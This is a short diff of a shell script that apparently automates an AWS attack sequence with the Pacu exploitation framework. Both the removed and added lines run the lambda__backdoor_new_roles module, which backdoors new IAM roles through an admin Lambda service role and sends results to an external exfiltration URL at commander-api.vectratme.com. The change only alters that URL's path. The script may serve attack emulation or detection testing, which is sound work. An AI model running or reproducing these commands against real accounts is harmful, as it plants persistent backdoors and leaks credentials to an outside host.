@@ -95,7 +95,7 @@ echo 'pacu: lambda__backdoor_new_roles'
 timer=${RANDOM:0:2}
 echo $(date -u)
 sleep $timer
-../pacu/cli.py --session backdoor_roles --exec --module-name lambda__backdoor_new_roles --module-args='--exfil-url https://commander-api.vectratme.com/adduser --role-arn arn:aws:iam::'"$AWS_ACCOUNT"':role/admin-lambda-service-role --arn arn:aws:iam::'"$AWS_ACCOUNT"':user/'$USERNAME
+../pacu/cli.py --session backdoor_roles --exec --module-name lambda__backdoor_new_roles --module-args='--exfil-url https://commander-api.vectratme.com/addrole --role-arn arn:aws:iam::'"$AWS_ACCOUNT"':role/admin-lambda-service-role --arn arn:aws:iam::'"$AWS_ACCOUNT"':user/'$USERNAME
 
 echo 'create roles'
 timer=${RANDOM:0:2}
